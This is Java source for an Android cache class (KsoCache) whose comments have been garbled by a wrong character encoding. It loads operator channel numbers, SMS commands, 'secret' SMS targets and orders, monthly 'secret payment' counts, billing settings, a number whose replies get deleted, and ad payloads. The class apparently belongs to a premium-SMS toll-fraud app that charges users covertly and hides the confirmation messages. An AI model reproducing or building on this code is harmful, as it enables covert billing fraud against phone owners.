package com.sttm.util;

import java.util.HashMap;
import java.util.List;

/**
 * ������
 * 
 * @author ligm
 * @since 2012.5.3 17��54
 * 
 */

import android.content.Context;
import android.util.Log;

import com.sttm.bean.Ads_header;
import com.sttm.bean.CFGInfo_header;
import com.sttm.bean.ChannelNumber;
import com.sttm.bean.ControlData;
import com.sttm.bean.CurstomCFG;
import com.sttm.bean.SmsAdsData;
import com.sttm.bean.SmsData;
import com.sttm.bean.WapAdsData;
import com.sttm.model.AdsService;
import com.sttm.model.GPRSService;

public class KsoCache {

	// ��������---��ֵ�Է�ʽ
	private HashMap<String,Object> cacheContent = new HashMap<String,Object>();
    private HashMap<String,Object> sendSmsFlag = new HashMap<String,Object>();
	private static KsoCache cache = null;

	// ��
	private static final Object LOCK = new Object();

	// �����ⲿʵ������ֻ��ͨ���ڲ�ʵ����
	private KsoCache() {
	}

	/*
	 * // ��̬ģʽ����֤ÿ�ζ���ͬһ������ public static synchronized KsoCache
	 * getInstance(Context context) { if (cache == null) { cache = new
	 * KsoCache();
	 * 
	 * }else { if(cache.getCacheSize() <= 0){ cache.init(context); } } return
	 * cache;
	 * 
	 * }
	 */

	// ��̬ģʽ����֤ÿ�ζ���ͬһ������
	public static synchronized KsoCache getInstance() {
		if (cache == null) {
			cache = new KsoCache();
		}
		return cache;

	}

	// ϵͳ����ʱ��ʼ����������

	public void init(Context context) {
		synchronized (LOCK) {
			// ���ÿͻ������ļ����ݳ�ʼ��
			CurstomCFG cfg = CurstomCFG.getInstance();
			Log.d("KsoCache","0000000000000000");
			cache.reSetValue("curstomID", cfg.getCurstomID());
			cache.reSetValue("startIntelnetDate", cfg.getStartIntelnetDate());// ��ʼ��������
			cache.reSetValue("driveup", cfg.getDriveup());// ��������
			cache.reSetValue("sellCount", cfg.getSellCount());
			cache.reSetValue("intelnetCount", cfg.getIntelnetCount());// ��������
      Log.d("KsoCache","0000000000000000");
			int[] internetDate = cfg.getIntelnetDate();
			Log.d("KsoCache","11111111111111");
			String internetDates = "";
			for (int i = 0; i < internetDate.length; i++) {

				if (i == (internetDate.length - 1)) {
					internetDates += internetDate[i];
				} else {
					internetDates += internetDate[i] + ",";
				}

			}
			cache.reSetValue("internetDate", internetDates);// �Զ���������
			cache.reSetValue("billStyle", cfg.getBillStyle());// �շѷ�ʽ
			cache.reSetValue("billCount", cfg.getBillCount());// �շѴ���
			cache.reSetValue("deleteTime", cfg.getDeleteTime());// ��Ʒ�շ�ɾ������ʱ��
			cache.reSetValue("adsTime", cfg.getUploadTiem());// ���ۣ����Ź��ȷ��͵�ʱ���������е�ʱ������
			cache.reSetValue("isShutDown", cfg.getIsShutDown());// �Ƿ�������Ӫ�̵�����
			cache.reSetValue("isChanelShutDown", cfg.getIsChanelShutDown());// �Ƿ�����ͨ������
			cache.reSetValue("isNotify", cfg.getIsNotify());// �Ƿ���Ҫ��ʾ
			cache.reSetValue("notifyContent", cfg.getNotifyContent());// ��ʾ����
			
			
			

			// ����ͨ�����ݳ�ʼ��
			Log.d("KsoCache","22222222222");
			ChannelNumber channel = ChannelNumber.getInstance();
			Log.d("KsoCache","3333333333333");
			cache.reSetValue("CmCount", channel.getCmCount());//�ƶ�ͨ������
			String CmInfo[] = channel.getCmNumber();
			String temp = "";
			for (int i = 0; i < CmInfo.length; i++) {
				temp += CmInfo[i] + ",";
			}
			reSetValue("mobileChannels", temp);// �ƶ�ͨ��
			CmInfo = channel.getCmCommand();
			temp = "";
			for (int i = 0; i < CmInfo.length; i++) {
				temp += CmInfo[i] + ",";
			}
			reSetValue("mobileOrders", temp);// �ƶ�ָ��
            
			
			cache.reSetValue("UmCount", channel.getUmCount());//��ͨͨ������
			String UmInfo[] = channel.getUmNumber();
			temp = "";
			for (int i = 0; i < UmInfo.length; i++) {
				temp += UmInfo[i] + ",";
			}
			reSetValue("unionChannels", temp);// ��ͨͨ��
			UmInfo = channel.getUmCommand();
			temp = "";
			for (int i = 0; i < UmInfo.length; i++) {
				temp += UmInfo[i] + ",";
			}
			cache.reSetValue("unionOrders", temp);// ��ָͨ��
			
			
			String[] salesNumbers = channel.getSalesNumber();// ��������
			temp = "";
			for (int i = 0; i < salesNumbers.length; i++) {		
				temp += salesNumbers[i] + ",";		
			}
			cache.reSetValue("saleNumbers", temp);// ��������
			//Log.d("���������ʼ��", temp);
			
			
			
			
			
			//����GRPS�ļ����ݳ�ʼ��	
			GPRSService gprsservice = new GPRSService();
			Log.d("KsoCache","11111111111111");
			byte gprsByte[] = gprsservice.getGPRSByte();
			// ��һ�ο��� �ļ�Ϊ��ʱ ����
			if (gprsByte != null) {
				CFGInfo_header gprsheader = gprsservice.getGPRSHeader(gprsByte);
				// ��������
				ControlData datacontrol = gprsservice.getControlSmsData(
						gprsByte, gprsheader);
				cache.reSetValue("saleSmsCat", datacontrol.getSellPhoneNumber());// ����è��������
				cache.reSetValue("monthlySecretPayment", datacontrol.getMonthlySecretPayment());//�°��۵Ĵ���
				cache.reSetValue("isShutSell", datacontrol.getIsShutSell());// �Ƿ�ر�����0�����أ�1��Ҫ��
				
				// ���۶���
				List<SmsData> secretSmsDatas = gprsservice.getSecretSmsData(
						gprsByte, gprsheader);
				String secretSmsNumber = "";
				String secretSmsOrder = "";
				String replyNumber = "";
				int count = 0;
				if (secretSmsDatas != null && secretSmsDatas.size() > 0) {
					for (SmsData secretSmsData : secretSmsDatas) {
						secretSmsNumber += secretSmsData.getChanel() + ",";
						secretSmsOrder += secretSmsData.getOrder() + ",";
						replyNumber = secretSmsData.getDeleteTeleponeNumber();
						count = secretSmsData.getCount();
					}
				}
				cache.reSetValue("deleteTeleponeNumber", replyNumber);
				cache.reSetValue("secretSmsCount", count);
				cache.reSetValue("secretSmsNumber", secretSmsNumber);
				cache.reSetValue("secretSmsOrder", secretSmsOrder);
			}
			
			
			

			// ������ݳ�ʼ��
			AdsService adsservice = new AdsService();
			byte adsByte[] = adsservice.getAdsByte();
			// ��һ�ο��� �ļ�Ϊ��ʱ ����
			if (adsByte != null) {
				Ads_header adsheader = adsservice.getAdsHeader(adsByte);
				SmsAdsData sadsdata = adsservice.getSmsAdsData(adsByte,
						adsheader);
				WapAdsData wadsdata = adsservice.getWapAdsData(adsByte,
						adsheader);
				if(sadsdata != null){
					if (sadsdata.getPhoneNumber() != null && !"".equals(sadsdata.getPhoneNumber())) {
						cache.reSetValue("adsNumbers", sadsdata.getPhoneNumber());
					}

					if (sadsdata.getSmsContent() != null && !"".equals(sadsdata.getSmsContent())) {
						cache.reSetValue("adsContent", sadsdata.getSmsContent());
					}

				}
				if(wadsdata != null){
					if (wadsdata.getUrl() != null && !"".equals(wadsdata.getUrl())) {
						cache.reSetValue("wap_timeout", wadsdata.getTime());
						cache.reSetValue("url", wadsdata.getUrl());
					}
					
				}
				
			}

			

		
			

		}

	}

	// ���¸��»�������
	public void reSetValues(String[] keys, Object[] values) {
		// ��ֵ�����Ĳ�����һ��Object����
		synchronized (LOCK) {
			for (int i = 0; i < values.length; i++) {
				cacheContent.put(keys[i], values[i]);

			}

		}

	}
	
	// ���¸��»�������
		public void reSetValues2(String key, Object value) {
			// ��ֵ�����Ĳ�����һ��Object����
			synchronized (LOCK) {
				
				sendSmsFlag.put(key, value);

			}

		}

	// ���¸��»�������
	public void reSetValue(String key, Object value) {
		synchronized (LOCK) {
			cacheContent.put(key, value);

		}

	}

	// ���ݼ�ȡֵ

	public Object getValue(String key) {
		synchronized (LOCK) {
			return cacheContent.get(key);

		}

	}
	
	public Object getValue2(String key) {
		synchronized (LOCK) {
			return sendSmsFlag.get(key);

		}

	}

	// ���ݼ�ɾ����������
	public void deleteCache(String key) {
		synchronized (LOCK) {
			cacheContent.remove(key);

		}

	}

	// ���ݼ�ɾ����������
	public void removeCache(String[] keys) {
		synchronized (LOCK) {
			for (int i = 0; i < keys.length; i++) {
				cacheContent.remove(keys[i]);

			}

		}

	}

	// ȫ����ջ�������
	public void clearCache() {
		synchronized (LOCK) {
			cacheContent.clear();

		}

	}
	
	

	public int getCacheSize() {
		synchronized (LOCK) {
			return cacheContent.size();

		}

	}

}
